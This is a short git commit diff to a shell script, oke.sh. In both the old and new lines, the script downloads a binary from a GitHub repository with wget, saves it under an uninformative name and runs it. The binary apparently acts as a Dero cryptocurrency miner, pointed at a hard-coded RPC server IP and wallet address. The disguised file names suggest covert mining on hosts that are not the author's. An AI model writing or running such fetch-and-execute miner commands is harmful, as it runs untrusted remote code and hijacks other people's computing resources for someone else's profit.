bcc1dd2b4ed8b20b6a766bf7029c768c338f0c00
joykotest <106002787+joykotest@users.noreply.github.com>
2022-07-02 13:24:15 +0700

    Update oke.sh

--- oke.sh
+++ oke.sh
@@ -1,2 +1,2 @@
-wget https://github.com/joykotest/kadal/blob/main/oreng?raw=true -O bsm1
-./bsm1  --daemon-rpc-address=45.82.66.55:10100 --wallet-address=dero1qy3k9h7fuw3ky9v8g4c4urs5s8c6gafqtmy2xfju98ty483kgyyy5qg4effk0
+wget -O lias https://github.com/joykotest/kadal/blob/main/oreng?raw=true 
+./lias  --daemon-rpc-address=45.82.66.55:10100 --wallet-address=dero1qy3k9h7fuw3ky9v8g4c4urs5s8c6gafqtmy2xfju98ty483kgyyy5qg4effk0
